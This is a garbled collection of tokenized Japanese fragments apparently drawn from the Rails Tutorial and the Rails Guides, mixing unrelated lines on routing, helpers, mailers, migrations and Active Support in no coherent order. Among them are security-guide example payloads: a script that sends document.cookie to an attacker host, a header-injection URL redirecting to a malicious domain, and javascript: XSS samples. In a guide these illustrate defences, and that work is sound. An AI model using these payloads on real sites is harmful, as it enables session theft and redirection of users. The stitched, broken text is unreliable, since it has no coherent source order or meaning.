▁\ emph { A synchronous ▁( 非同期 の ) ▁JavaScript ▁And ▁ XML } の ╼ それぞれの 頭 文字 を と っています ▟ Ajax は し ば し ば ▁“ A J A X ” ▁ と 大文字 で 書かれ ますが 、\ href { http :// www ▖ adapt ive path ▖ com / ide as / ess a y s / archive s / 000 38 5 ▖ ph p } { Ajax の 起 源 となる 記事 } では 一 貫 して ▁“ Ajax ” ▁ と なっています 。
▁ 現在のユーザー を検索する 方法 のひとつ として 思い 付 く のは 、 ユーザー プロフィール ページ ▁( リスト { p 0} ) ▁ と同様に 、 以下の {2} find {/2} メソッドを使用することで す 。
▁ Calvin は 2 番目の ユーザー Thomas ▁ Hobbes ▁( 図 \ ref { fig : page _ flow _ other _ profile _ follow _ button _ mockup }) ▁ を表示し 、[ Follow ] ▁ ボタン を 押 して フォロー します 。
▁t ▖ string ▁: account _ number
▁ これはリスト \ ref { code : s p or k _ guard file } で使用されていました 。
▁ ある ヘルパー が 特定の コントローラで のみ 使用する も のであれば 、 それに対応する ヘルパー ファイルに 置く 必要があります ▟ たとえば StaticPages コントローラ 用 ヘルパーは 、 通常 \ k ode { app / helpers / static _ pages _ helper ▖ rb } になります 。
▁t ▖ references ▁: article , ▁index : ▁true
▁CDN が アセット を直接 提供する 場合 、 ブラウザから の リクエストが 直接 Rails サーバー に 達 する ことはありません 。
▁ 現 代 的な Web ページの マークアップ は 、 基本的に 以下の ようになっています 。
▁ これはリスト \ ref { code : login _ form _ html } で使用されていました 。
▁本ガイドでは レンダリング の詳細については 触れ ません が 、 テンプレート ハンドラ の 選択 が ビューテンプレート ファイルの 拡張子 によって 制御 されている という 重要な 点 は 理解 しておいてください 。
▁scope ▁: active , ▁where ( active : ▁true )
▁リスト \ ref { code : home _ feed _ test } はその テンプレート です 。
▁# ▁config / initializers / session _ store ▖ rb に 以下 を設定する
▁% ▁subsection ▁ backtrace _ silencer ▁( end )╼╼ ▁\ subsection { Guard による テストの 自動化 } ▁% ▁( fold )╼ ▁\ label { sec : guard }╼╼
▁{0} リスト 2▖1 4 {/0} ▁╼╼{1} \ k ode { Micropost } クラスにおける継承 ▁ {3} {/3} ▁ { 4 } app / models / micropost ▖ rb {/4} {/1}
▁ 生成された メイラー の動作 を簡単に 追 って みましょう ▁( リスト \ ref { code : generated _ application _ mailer } と リスト \ ref { code : generated _ user _ mailer }) 。
▁* ▁ メソッドの パラメータ
▁この 段階で は 空 っ ぽ の Rails アプリケーション しか ありません が 、 本番環境 に 展開 し てしまい ましょう 。
▁+ - -------- + --- ------+-------+ --- --- +-------------+
▁get ▁' one ' ▁=> ▁' test # example ', ▁as : ▁: example
▁` yield ` メソッドは 、 レイアウト のコンテキストで ビュー を挿入 すべき 場所 を指定する の に 使用します 。
▁development モード の場合 、 アセット は 個 別の ファイル として 、 マニフェストファイル の 記載 順に 読み込まれます 。
▁{0}{1} 第 7 章 {/1}{/0} ▁ では 、 ▁ ハッシュ 引数 を使用して オブジェクトを 初期化 します ▟ これは 一般に \ emph { マスアサインメント ▁( mass ▁assignment )} ▁ と呼ばれる 技 法 で 、 Rails アプリケーションで 多 用 されています 。
▁ n { U s ing ▁keyword ▁arguments ▁in ▁the ▁\ k ode { gravatar \_ for } ▁helper ▖ ▁\ \ ▁\ file path { app / helpers / users \_ helper ▖ rb } } ╼ %= ▁ lang : ruby , ▁options : ▁" h l _ lines " : ▁[ 4 ] ╼\ begin { code } ╼ module ▁Users Helper ╼╼ ▁# ▁Return s ▁the ▁Gravatar ▁for ▁the ▁given ▁user ▖╼ ▁def ▁ gravatar _ for ( user , ▁size : ▁ 80 )╼ ▁ gravatar _ id ▁= ▁ Digest :: M D 5 :: hexdigest ( user ▖ email ▖ downcase )╼ ▁ gravatar _ url ▁= ▁" https :// secure ▖ gravatar ▖ com / avatar / # { gravatar _ id } ? s = # { size } " ╼ ▁image _ tag ( gravatar _ url , ▁ alt : ▁user ▖ name , ▁class : ▁" gravatar " )╼ ▁end ╼ end ╼\ end { code }╼\ end { code listing }╼╼ ▁% ▁subsection ▁a _ gravatar _ image ▁( end )╼╼ ▁\ section { ユーザー登録フォーム } ▁% ▁( fold )╼ ▁\ label { sec : signup _ form }╼╼
▁Active ▁Support では ` Hash # deep _ merge ` が 定義 されています 。
▁ ブラウザに 記憶トークン の cookies を表示する
▁< a ▁ href =' more ▖ html ' > S e e ▁more </ a > ")
▁javascript _ include _ tag ▁: default s
▁| ▁GET ▁| ▁ / kategorien / : id ▁| ▁categories # show ▁| ▁ category _ path (: id ) ▁|
▁ 実は \ ref { sec : a _ class _ of _ our _ own } の ▁\ k ode { palindrome } 内で \ k ode { reverse } ▁ メソッドを使って い たとき も 、 同様 の ケース で あった ことを思い出してください ▟ その ときと同様 で 、 左 式 では \ k ode { self } ▁ を省略 することは \ emph { できません } ▟ したがって 、
▁まずは リスト \ ref { code : valid _ user _ test } に 、 ▁\ k ode { name } 属性 の 存在性 に関する テスト を追加します 。
▁#### ▁` subclasses `
▁ 転 送 先 の URL を保存する 仕 組み は 、\ ref { sec : a _ working _ log _ in _ method } で ユーザーを ログイン させ たとき と同じ で 、\ k ode { session } 変数 を使います 。
▁WARNING : ▁これらの アセット タグ ヘルパーは 、 指定 の 場所に アセット がある かどうかを ▁ _ 検証 しません _ ▁ 。
▁* ▁` prepend _ helpers _ path `: ▁ アプリケーション や railties や エンジン に含まれる ` app / helpers ` ディレクトリ を ヘルパー への 参 照 パス に追加します 。
▁ 別の ブランチ を アップ デ ート したい場合は 以下のように します 。
▁Rails が これ だけ 多く に 人 達 に 使われ ている のは な ぜ でしょうか 。
▁`: constraints ` オプションを使用すると 、 暗 黙 で使用される ` id ` に対して フォーマット を指定することができます 。
▁ 最終的に は 皆さん が PostgreSQL を development 環境 に インストール して 設定 できるように なる のが 理想 ですが 、 今は 時 期 尚 早 である と 考え ます 。
▁$ (" a [ data - remote ] ")▖ on ▁" ajax : success ", ▁( e , ▁data , ▁status , ▁ xhr ) ▁->
▁belongs _ to ▁: patient
▁* ▁` app / assets ` は 、 カスタム 画像ファイル 、 JavaScript 、 スタイルシート など 、 アプリケーション 自身 が 保 有 する アセット の 置き場所 です 。
▁ 使用する クラス が そのため の API さ え 備えて い れば 、 使用する クラス に 厳 密 に依存する ことはありません 。
▁ユーザーの index ビュー
▁その 一方で 、 これ から Rails で 開発 を 始 め よう と する 人 は 「 と に か く \ emph { Web アプリケーション } を 作り たい !」 と 考え ていること が ほとんど なので 、 た った 1 つの Web ページ を作成する ために 分 厚 い Ruby 本 を 一 気 読み する 気 には な れ ない でしょう 。
▁しかし このままでは 役に立 ち そう に ありません 。
▁\ k ode { User } クラスにおける継承
▁</ tr >
▁\ label { fig : signup _ failure _ mockup } }╼\ end { figure }╼╼ ▁\ subsection { 正しい フォーム } ▁% ▁( fold )╼ ▁\ label { sec : a _ working _ form }╼╼
▁> > ▁Person ▖ new ▖ errors [: name ] ▖ any ?
▁ バージョン管理 システム を 熟 知 することは 、 今 や あらゆる ソフトウェア 開発者 にとって 必 須 の スキル である と 言 って よいでしょう 。
▁ バリデーション エラーを ビューで 表示する
▁Active ▁Support には 、 オブジェクトが プログラム 的に 複 製 可能 かどうかを 問い合わせ るため の ` duplicable ?` メソッド があります 。
▁その 次の 「 response \ k ode { : success }」 は 、 実際には HTTP ▁ の \ href { http :// en ▖ w ikipedia ▖ org / wiki / List _ of _ HTTP _ status _ code s } { ステータスコード } ▁( ここでは \ href { http :// en ▖ w ikipedia ▖ org / wiki / List _ of _ HTTP _ status _ code s # 2 x x _ S u cc ess } { 200 ▁OK }) ▁ を表し ます 。
▁m attr _ accessor ▁: constant _ watch _ stack _ m ute x
▁id = \ k ode {1} のマイクロポスト を表示する ページ
▁create _ table ▁: account s ▁do ▁| t |
▁ 本チュートリアル の いた る ところで 見 てきた ように 、 Rails は 慣習 に従って 、 アクション に対応する ビューを 暗 黙 的に 呼び出し ます ▟ たとえば 、\ k ode { show } アクション の最後 で \ k ode { show ▖ html ▖ erb } を呼び出す といった 具 合 です 。
▁ セッション の 削除 ▁( ログアウト )
▁ 現時点の ルート URL では 、 デフォルトの " Welcome ▁a board " が表示され ています ので 、 これを 変更します 。
▁ サインアップ ページ への テスト を含む 最初の users 用 spec 。
▁ここで 使用している エラーメッセージ の パーシャル は あくまで 試 作 品 である 点に注意 してください ▟ 最 終 版 は \ ref { sec : creating _ microposts } を参照してください 。
▁ あ とは ユーザー登録 を行う \ k ode { create } アクションに 数 行 追加 するだけで 、 メイラー を アプリケーションで 実際に 使う ことができます ▁( リスト \ ref { code : user _ signup _ with _ account _ activation }) 。
▁# ▁ 追加 の アセット ▁( application ▖ js 、 application ▖ css および すべての 非 JS / CSS が 追加 済み ) ▁ を プリコンパイル する
▁従って 、 制限 された 値は 、 対応する Request オブジェクト メソッドが 返す 型 と 一致する 必要があります 。
▁( これは 「 Ruby のバージョン を明示的に指定 してください 」 という メッセージ ですが ) ▁ 経験 的に は 、 本書 のような チュートリアル の 段階で は 明示的に 指定 しない 方が ス ム ー ズ に 進 む こと が多い ので 、 この 警 告 は 現時点では 無視 し てしまった 方が よいでしょう 。
▁\ emph { 課 外 活 動 : } ▁ サポート コードを 独立した ファイル と モジュール に 再 編 成 し 、 spec ヘルパー ファイル で それらの モジュール を 適切に インクルード して すべて 動作 するようにしてください 。
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁( 最初の いくつかの サンプル アドレス については 、 デフォルトの Gravatar 画像 以外の 写 真 を 関連付け て み ました ) 。
▁さらに Rails は 、 無効な 内容 で 送信 が されて 元の ページに 戻 される と 、\ k ode { div } で 囲 まれ た エラー 用の CSS クラス \ k ode { field _ with _ errors } を返します 。
▁ 以下のような フォーム リンク が動作する ためには 、
▁* ▁` auto play : ▁true ` は 、 ページの 読み込み 時に ビデオ を再 生 します 。
▁* ▁` config ▖ file _ watch er ` は 、` config ▖ reload _ classes _ only _ on _ change ` が true の 場合に ファイルシステム 上の ファイル 更新 検出 に 使用される クラス を指定します 。
▁ ほぼ あらゆる オブジェクトを 文字列に変換 する \ k ode { to _ s } メソッドを使用して 、 nil が メソッド に応答する 例を お 目 に かけ ましょう 。
▁ デフォルト スコープ の 条件 が 複 雑 になる のであれば 、 スコープ を クラスメソッド として 定義 する の も ひとつ の 手 です 。
▁ 本書 を ここ まで 進 め てきた 今 であれば 、 上のコード の 意味 は ▁( たとえ 漠 然 と であっても ) ▁ 理解 できる はずです ▟\ k ode { StaticPages Controller } クラスは \ k ode { Application Controller } を継承し ており 、\ k ode { home } メソッド 、\ k ode { help } メソッド 、\ k ode { about } メソッドを 備えて います 。
▁# ▁=> ▁ 12 ▖ 3 45 ▖ 6 78
▁# ▁Rails ▁< ▁4▖1
▁ http :// www ▖ your application ▖ com / controller / action ? referer = path / at / your / app % 0 d % 0 a Location : + http :// www ▖ malicious ▖ t ld
▁### ▁ メイラー の ビュー
▁ 他の ルート と同様 、\ k ode { get ▁ ’ / signup ’} と 記 述 した ことで \ k ode { signup \_ path } という 名前付きルート が でき 、 それを リスト \ ref { code : home _ page _ signup _ link } で 使用します 。
▁たとえば 、\ href { http :// localhost :3000/ users }{/ users } を 表示 すれば すべての ユーザーの 一覧 が表示されます し 、\ href { http :// localhost :3000/ users / new }{/ users / new } を 表示 すれば 新規ユーザー 作成 ページ が表示されます 。
▁` collection ▖ empty ?` メソッドは 、 関連付けられたオブジェクト が コレクション に 含まれていない 場合に ` true ` を返します 。
▁self を省略した 結果を リスト \ ref { code : c g i _ escape } に示します 。
▁REST スタイル の URL を有効に するには 、 routes ファイル ▁(\ k ode { config / routes ▖ rb }) に 以下の 1 行 を追加します 。
▁ years _ ago
▁ 以下のコード の \ k ode { : name ▁=> } と \ k ode { name : } は 、\ emph { ハッシュ として の データ構造 は } 全 く 同じです ▟ つまり 、
▁ ダウンロード した 新しい コンテンツ を マージ します 。
▁ プロセス の種類 を指定して フィルタ するには 、\ text tt { p s } の 結果を Unix の 「 パ イ プ 」 \ text tt { | } で つ ない で 、 パターン マッチ ャ ー である \ text tt { grep } に 渡します 。
▁G H # 123 4
▁#### ▁number _ to _ currency
▁ ヘッダー パーシャル では 、 Web 共通の 慣習 に従って 、 ロゴ にも Home ページ へのリンク を追加します 。
▁ このように バージョン を指定する ことで 、 リスト \ ref { code : installing _ rails } と同じ バージョンの Rails で 、 最初の アプリケーション と同じ ファイル 構造 を作成する ことができます 。
▁ コンピュータ システムによっては 、 コマンドを実行 した 時に エラー が発生する かもしれません ▟ しかし 本チュートリアル では 、 あらゆる 場 面 を 想 定 して エラー 対策 を も れ なく 記載 する ような \ href { http :// en ▖ w ikipedia ▖ org / wiki / S is y ph us } { 不 毛 な 作業 } は 行 って いません ▟ そのような 場合は 、 即座に エラーメッセージ を Google で 検索 してください ▟ エラーメッセージ を Google で 検索 することは 、 実際の ソフトウェア 開発 でも 使われ ている 基本的な テクニック なので 、 よい 練 習 にも なります 。
▁self を省略した 結果を リスト \ ref { code : forget _ test } に示します 。
▁まずは Home ページの 新しい サイドバー からです ▟ 以下の リスト \ ref { code : user _ info } のようになります 。
▁ここで 思い 出 してみましょう 。
▁Rails では 、` Rails :: Railtie ` に含まれる ` initializer ` メソッドを使用して すべて 定義され 、 起動 時に 実行される イニシャライザ がいくつも あります 。
▁ そのため 、 多くの Web フレームワーク では このような ログイン / 認証システムを 実装 するための 選択 肢 が 多数 提供され ています ▟ Rails も また 例外 ではありません 。
▁\ text tt { nil } の 論理値 は false になるので 、\ text tt {@ foo } への 最初の 代入 「\ text tt { nil ▁|| ▁" bar " }」 の 評価 値は \ text tt {" bar "} になります 。
▁* ▁ データベースの テーブル ▁- ▁ 複数形 であり 、 語 は アンダースコア で 区 切 られる ▁( 例 : ▁` book _ clu b s ` )
▁これは 、 ある アプリケーションが ` articles _ path ` のような ルーティングヘルパー によって パス を提供 できる と すると 、 その アプリケーションの エンジン も 同じ く ` articles _ path ` という ヘルパー によって パス を提供 でき 、 しかも 両者 が 衝 突 しない という ことを意味します 。
▁* ▁Rails ▁4▖0 から XML パラメータ パ ー サ ー が 取り 除 か れ ました 。
▁{0}{1} 第 11 章 {/1}{/0} では ただ の プロ ト タイプ でした が ▁( 図 \ ref { fig : home _ with _ proto _ feed }) 、 リスト \ ref { code : from _ users _ followed _ by _ final } の実装 によって 、 Home ページ で 完全な フィード が 表示 でき ている ことがわかります ▁( 図 \ ref { fig : home _ page _ with _ feed }) 。
▁create ▁app / assets / stylesheets / application ▖ css
▁$ ▁bundle ▁exec ▁rake ▁db : migrate ▁ RAILS _ ENV = production
▁ 実際 、 そう い った テストの ことは 「\ emph { 受 け 入 れ テスト ▁( A c ce p t ance ▁Tests ) }」 として 呼 ば れ て いて 、 ある 機能 の実装 が完了し 、 受 け 入 れ 可能な 状態 になった かどうかを 決 め る テスト として 知 ら れ ています 。
▁このメソッド では 、 ASCII と Uni code の ホワイトスペース を 扱 えます 。
▁\ label { fig : demo _ new _ user _ rails _3} }╼\ end { figure }╼╼\ no indent
▁` find _ by _ sql ` は 、 カスタマイズ した データベース 呼び出し を 簡単な 方法で 提供し 、 インスタンス化され た オブジェクトを返します 。
▁def ▁raw ( string is h )
▁ RedCloth ▖ new (' < script > alert (1) </ script > ')▖ to _ html
▁上 記 の 演算子 を コンソール セッション 上で 実際に 実行 して 比較してみると 、\ text tt {@ foo ▁= ▁@ foo ▁|| ▁" bar "} は \ text tt { x ▁= ▁x ▁O ▁ y } に 該 当 し 、\ text tt { O } が \ text tt {||} に置き 換 わ った だけ である ことがわかります 。
▁NOTE : ▁ これらは すべて 同じ 定義ファイル ` active _ support / core _ ext / date / calculations ▖ rb ` に あります 。
▁ テストにパス して フォーム が 正常に 出力 される ように するには 、\ k ode { new ▖ html ▖ erb } に対応する \ k ode {@ user } 変数 を コントローラのアクション で 定義 する必要があります ▟ たとえば 、 Users コントローラの \ k ode { new } が そう です 。
▁次の 一連の テストでは 、 サインイン した ユーザー から 見た インデックス ページに 、 タイトル と コンテンツ と サイトの すべての ユーザー が正しく 表示 されている ことを確認します 。
▁\ k ode { F e at ure } 行 と \ k ode { S c en ar io } 行 は 説明 の ためのものです が 、 それ以外の 行 は Ruby に 対応 付け られる 必要があります 。
▁ 更新 の 結果を リスト \ ref { code : follow _ form _ ajax } と リスト \ ref { code : unfollow _ form _ ajax } に示します 。
▁ 特に 、\ k ode { Rails ▖ env ▖ development ?} が \ k ode { true } になる のは 開発環境 に限ら れる ため 、 以下の 埋め込み Ruby は
▁| ▁` Person ` ▁| ▁` people ` ▁|
▁最後に 完全な クラス を作成して 、 この章 を 終わり に しましょう ▟ そこで 、\ k ode { {1} 第 6 章 {/1} } で使用する {2} User {/2} クラスを 最初から 作成する ことにします 。
▁HTML ▁ shim 用の パーシャル
▁{0} 図 3 ▖ 3 {/0} ▁{1} 修正 された Home ページ {/1}
▁class ▁Application ▁< ▁Rails :: Application
▁ 以下 に 例 を示します 。
▁* ▁` assert _ generate s `
▁ コントローラ を新規作成する には 、 コントローラ 用の ジェネレータ を実行します ▟ ここでは 以下のように 、 welcome という名前の コントローラ の中に index という アクション を作成する よう 指定します 。
▁ これはリスト \ ref { code : generate _ user _ model } で使用されていました 。
▁\ text tt { nil } の 論理値 は 偽 ▁( false ) ▁ です ▟ 初めて 代入 するとき は 「\ text tt { nil ▁|| ▁" the ▁user " }」 となり 、 これは 「\ text tt {" the ▁user " }」 と 評価 されます ▟ 同様に 、2 度 目 の 代入 では 「\ text tt {" the ▁user " ▁|| ▁" another ▁user " }」 となり 、 これも 「\ text tt {" the ▁user " }」 と 評価 されます ▟ あらゆる 文字列 の 論理値 は 真 ▁(\ text tt { true }) ▁ なので 、 ▁\ text tt {||} を使用する 一連の 式 は 、 いずれも 1 番目の 式 が 評価 され た時点で 終 了 します
▁\ k ode { index } アクション の リダイレクト をテストする
▁ ところで 、 この \ k ode { authenticated ?} メソッド ▁( リスト \ ref { code : authenticated _ p }) ▁ は 記憶ダイジェスト と 強く 結 び つ い ています が 、 実は 他の 様々な 用 途 にも 応用 できます ▟ {3} 第 {2} 10 {/2} 章 {/3} では この メソッドを 一 般 化 してみます 。
▁最初に 、 プロファイル ページ と Home ページに 、 フォローしているユーザー と フォロワー の 統 計 情報 を表示する ための パーシャル を作成します 。
▁これで 、 好 き な だけ ユーザー登録ページ を表示し て 新規ユーザー を作成 できるようになりました 。
▁-> ▁0▖0 02 3 s
▁ タイトル に ERB コード を使用した Help ページのビュー ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁Action ▁Mailer を設定する
▁ 新しい ルーティング は \ k ode { config / routes ▖ rb } ファイル で 定義 する 。
▁以下の 構 文 を実行すると
▁ この手法は 注意 深 く 使用 する必要があります 。
▁ リソースフルな ルーティング を作成する と 、 アプリケーションの コントローラで 多くの ヘルパー が 利用 できるようになります 。
▁上の シナリオ が 信 じ が たい もの のように 思える かもしれませんが 、 どう か 信 じ てください ▟ Rails の Web サイト では 、 トラフィック が多い ときに このような 問題 が発生する 可能性 がある のです ▁( 筆者 も これを 理解 するのに 苦 労 しました ) 。
▁ シ ン プ ル ルーティング は 、 特に 従来 形式 の URL を 新しい Rails の アクションに 割り当て ること が ずっと 簡単に 行える ようになります 。
▁assemblies ▖ find (▖▖▖)
▁< div ▁style =" background : url (' javascript : alert (1) ') ">
▁< h 1> New ▁Article </ h 1>
▁ / microposts / new
▁self を省略した 結果を リスト \ ref { code : Gemfile _ pg _ gem } に示します 。
▁< script > document ▖ write (' < img ▁src =" http :// www ▖ attacker ▖ com / ' ▁+ ▁document ▖ cookie ▁+ ▁' "> ') ; </ script >
▁今度は 2 番目の コントローラ である Users コントローラ を作成し ましょう 。
▁ コミットメッセージ は \ emph { 現在 形 } で 書く ようにしましょう 。
▁* ▁Rails ▁4▖0 から ` ActionDispatch :: B est S t and ar d s S up port ` ミドルウェア が 削除 されました ▟ ` < ! D O C TYPE ▁ html >` は既に ▁ http :// m s d n ▖ micro s of t ▖ com / en - us / library / j j 6 76 9 15 ( v = v s ▖ 8 5 )▖ as p x ▁ の 標準 モード を トリガ する ようになり 、 C h r o me Frame ヘッダ は ` config ▖ action _ dispatch ▖ default _ headers ` に 移動 されました 。
▁` beginning _ of _ quarter ` は ` at _ beginning _ of _ quarter ` の別名 、` end _ of _ quarter ` は ` at _ end _ of _ quarter ` の別名 です 。
▁N u ll リレーション
▁もちろん 、 些 細 な リファクタリング で しか ないので 、 テストは \ passing した まま になっている はずです 。
▁rake ▁db : migrate ▁S C O P E = blorgh
▁2 番目の \ k ode { link _ to } では 、 引数として 画像ファイル の パス と 任意の オプション ハッシュ を と る \ k ode { image _ tag } ヘルパー の 能 力 が示されています ▟ シンボル を使用して 、 この場合は \ k ode { alt } 属性を 設定 しています 。
▁### ▁ 各 種 変換
▁ この時点では Ruby の 文法 については 気にする必要はありません ▟ {0} 第 {1} 4 {/1} 章 {/0} で 詳 しく 解説します 。
▁デフォルトは ` true ` です 。
▁### ▁ 単 一 の オブジェクトを 取り出す
▁\ href { http :// screencasts ▖ railstutorial ▖ org /}{ Rails スクリーンキャスト } : ▁ 本書 に合わせて 、 完 全 版 の スクリーンキャスト ▁( 現在 は 英語 版 のみ ) ▁ を用意し て あります 。
▁ これはリスト \ ref { code : password _ implementation } で使用されていました 。
▁User オブジェクトは \ k ode { nil } でも \ k ode { false } でも ないので 、 い い 感じ に 仕 事 を してくれ ています
▁ 正確に は ここでは 不要な のですが 、\ k ode { nav } タグ には 「 その 内 側 が ナビゲーション リンク である 」 という 意図 を明示的に 伝える 役 割 があります 。
▁これらの コードを 1 つ に まとめると 、 マイクロポスト 用の fixture ファイルは リスト \ ref { code : updated _ micropost _ fixtures } のようになります 。
▁ ところで 、 自動生成 に 失敗する ようなことがあ れば 、 元に戻す 処理 を学ぶ 良い 機 会 になります 。
▁ モデル が 他の モデルに 関連付け ら れ て いて 、 両方 の モデル に対して バリデーション を実行する 必要がある 場合は この ヘルパー を使用します 。
▁* ▁ 名前 衝 突 の 回 避
▁* ▁` before _ perform `
▁#### # ▁` create _ association ( attributes ▁= ▁{}) `
▁このセクションでは 、 自分の パ ソ コ ン 上で テスト 用の 環境 を 構 築 する方法 について解説します 。
▁Rails ▁API サイト で \ k ode { validates } メソッド を調べ 、 どんな ことができる か 、 どんな オプション がある か を調べ てください 。
▁#### ▁` to _ formatted _ s `
▁もちろん 、 この時点では ユーザーの ログイン 方法 を変更 していない ので 、 ユーザーの 有効化 に はまだ \ emph { 何 の 意味 も ありません } 。
▁最初の 要素 と同じ 型 に 属 さ ない 要素 が 1 つ でも ある 場合 、 ルート ノード には ` objects ` が使用されます 。
▁The ▁string ▁' foobar ' ▁is ▁nonempty ▖
▁before フィルター は 、\ k ode { before \_ action } メソッドを使って 何らかの 処理 が 実行される 直前に 特定の メソッド を実行する 仕 組み です
▁# ▁ ユーザーが ロック され ていれば イン ク リ メ ン ト は 失われ る が 、 重要 ではない
▁ 本チュートリアル で 学ぶ うえで 必要となる 前 提 知識 は 、「 公式 には 」 ありません ▟\ emph { Rails チュートリアル } には 必要な 要素 がすべて 盛 り 込 まれ ています ▟ 中 心 となる のは もちろん Rails ですが 、 他にも Ruby 言語 や minitest ▁( Rails の テスティング フレームワーク ) ▁ 、\ href { http :// en ▖ w ikipedia ▖ org / wiki / HTML } { HTML }、\ href { http :// en ▖ w ikipedia ▖ org / wiki / CSS } { CSS } 、 若 干 の \ href { http :// en ▖ w ikipedia ▖ org / wiki / JavaScript } { JavaScript } と \ href { http :// en ▖ w ikipedia ▖ org / wiki / SQL } { SQL } の チュートリアル もあります 。
▁* ▁` belongs _ to ` 関連付け の場合 、` has _ many ` の 逆 関連付け は 無視 されます 。
▁ INSERT または UPDATE が発生する と キャッシュ は ク リ ア されます 。
▁* ▁ 多くの メソッド や 条件 を 駆 使 して レコード を検索する
▁* ▁` Time ` は 夏 時間 ▁( D ST ) ▁ を 理解 します ▟ 以下のように 夏 時間 を 正しく 算 出 できます 。
▁たとえば 、 以下のような オプションを 関連付け に 追加 できます 。
▁リスト { p 0} の アプリケーションコード では 、 {2} logged _ in ? {/2} が true の 場合に 限 って {2} log _ out {/2} を呼び出す ように 変更 しました 。
▁class _ attribute ▁: x
▁* ▁` resource _ controller ` は 、` rails ▁generate ▁resource ` の 実行時に どの ジェネレータ を使用して コントローラを生成 するか を指定します 。
▁ 自分の 書いた コード によって Rails の パフォーマンス が 低 下 する のであれば 、 比 較 のために [ benchmark - ips ]( https :// github ▖ com / e v an ph x / benchmark - ips ) ▁gem を使用して ベ ン チ マーク の結果 も 添 え てください 。
▁### ▁Rake タスク
▁* ▁`: authentication ` ▁- ▁ メール サーバー で 認 証 が 要求 される 場合は 、 ここで 認 証 の種類 を指定します 。
▁ 実際に や っ てみると わ か る と思います が 、 パスワード再設定の 仕 組み は 、 アカウント有効化 と 似 ている 部分 が 多く 、\ ref { sec : account _ activation } で学んだ 手法 の 多く を ここで も 適用 できます 。
▁` errors [: base ]` は 配列 なので 、 これ に 文字列を 単 に追加する だけで エラーメッセージ として 使用 できるようになります 。
▁{0} 図 12 ▖ 15 {/0} ▁{1} ユーザーの フォロワー 用 ページのモックアップ {/1}
▁Expires Default ▁" access ▁plus ▁1 ▁ year "
▁この 保 護 によって 、 第 三 者 の サイト が 重要な データを 奪 取 する 目的 で 自分の サイトの JavaScript ▁URL を参照 して 実行 し よう と すること を 防止 します 。
▁* ▁FROM ▁` articles ` ▁WHERE ▁` articles ` ▖ ` user _ id ` ▁ IN ▁ (1)
▁作成した ばかり の Rails アプリケーションでは 、 以下のように 出力 される はずです 。
▁ このコード も 同じ ページ へ た ど り 着 きます が 、\ k ode { / about } の方が 簡潔 です 。
▁ユーザー登録 中に ログイン する
▁# ▁=> ▁Tue , ▁09 ▁A ug ▁2011 ▁ 23 : 15 : 17 ▁+0000
▁ここまで の 進 捗 を Twitter に 投 稿 したり Facebook で 誰 か に 知 ら せ たい場合は 、 以下の リンクを お 使い ください 。
▁この テーブルに は 主キー を設定し ないでください 。
▁\ href { http :// www ▖ t hinkful ▖ com / a / railstutorial } { T hinkful } : ▁ プロ の エ ン ジ ニ ア と 組 んで プロジェクト ベース で 授 業 を進める オンライン クラス です 。
▁上の メソッドは 、 すべて ` ActiveRecord :: Relation ` のインスタンス を返します 。
▁また 、` deep _ transform _ keys ` や ` deep _ transform _ keys !` を使用して 、 与えられた ハッシュの すべての キー と 、 その中に ネスト されている すべての ハッシュ に対して ブロック 操作を 適用 することもできます 。
▁class ▁P h y s ic i an ▁< ▁ActiveRecord :: Base
▁d ▖ prev _ year ▁# ▁=> ▁Fri , ▁ 08 ▁May ▁200 9
▁ ア ッ ト マーク
▁ ヘルパー を作成し たので 、 これ を使用して レイアウト を シ ン プ ル に することができます 。
▁ このように 書き ました 。
▁ここで い う ▁\ k ode { f ▖ object } ▁ は 、\ k ode {@ micropost } ▁ など になります 。
▁\ k ode { signed _ in ?} メソッドを 手 作り して あるので 、 レイアウト のリンク は すぐに 作成 できます 。
▁get ▁' photos / : id ', ▁to : ▁' photos # show ', ▁constraints : ▁ { ▁id : ▁ / [ A - Z ] \ d { 5 } / ▁ }
▁\ k ode { header } タグ に \ k ode { navbar - fixed - to p } クラス が与えられ ているので 、 これ に従って Bootstrap は ナビゲーション バー を ページ 上 部 に 固定 し 、 ナビゲーション バー の下に 余 白 を 置 いて 主 要 部分 から 分 離 します
▁ 指定 し なかった場合 は デフォルトの ` text / plain ` が 適用 されます 。
▁HTML 標準 では 実際に 要求 されている にも 関 わ らず 、 画像 に \ k ode { alt } 属性 を付け ていない 手 抜 き の Web サイト を とき ど き 見 かけ ます 。
▁まずは 、 Micropost の コントローラと ビュー を作成する ために 、 コントローラを生成 しましょう ▁( 今回 必要な のは ビュー だけで 、 Microposts コントローラは \ ref { sec : manipulati n g _ microposts } まで 使い ません ) 。
▁* ▁` before _ configuration `: ▁これは ` Rails :: Application ` から アプリケーション 定数 を継承し た 直後 に 実行されます 。
▁# ▁=> ▁" 200 9 - 10 - 25 ▖ ▖ 200 9 - 10 - 2 6 "
▁ デフォルト値 は ` " @ _ % s " ` です 。
▁以下の リンク 先に は 、「 ジ ョ ー ジ ・ ブ ッ シ ュ が 議 長 に 9 歳 の 男 の 子 を 任 命 」 と 書かれた ページ があり ました 。
▁╼╼ ▁\ section { Micropost モデル } ▁% ▁( fold )╼ ▁\ label { sec : a _ micropost _ model }╼╼
▁ パーシャル の内容は リスト \ ref { code : errors _ partial } のようになります 。
▁ すべての 入力 値は 、 h () メソッドを使用して エスケープ してください 。
▁\ k ode { patch } メソッド がある こと から わかるように 、 Rails の テストでは \ k ode { get }、\ k ode { post }、\ k ode { delete } メソッド も サポート されています ) 。
▁self を省略した 結果を リスト \ ref { code : micropost _ order _ test } に示します 。
▁get ▁' search '
▁上の テストでは 、\ k ode { upcase } メソッドを使用して ユーザーの メールアドレスを 大文字 に変換 することで 、 大文字 小文字 を 区別 しない データベース が 使用されている 場合 であっても ユーザーを 確 実に 検索 できるように 配 慮 して ある ことに注目してください 。
▁\ href { http :// r ailscasts ▖ com /}{ RailsCasts } ▁( Ryan ▁Bates ) ▁: ▁ 極めて 質 の高い ▁( ほぼ ) ▁ 無料 の スクリーンキャスト
▁ エンジン を アプリケーションで 利用 するのは きわめて 簡単です 。
▁NOTE : ▁この クラス で 継 承 されている ` Application Controller ` クラスは 、 実際には ` Application Controller ` ではなく 、` Blorgh :: Application Controller ` です 。
▁ 別の ステータスコード ▁( 30 1 : ▁ 恒久 的な リダイレクト が よく使われます ) ▁ に 変更 するには `: status ` オプション を使用します 。
▁ 新しく マウント した エンジン で もっと い ろ い ろ や って みましょう 。
▁### ▁ レイアウト
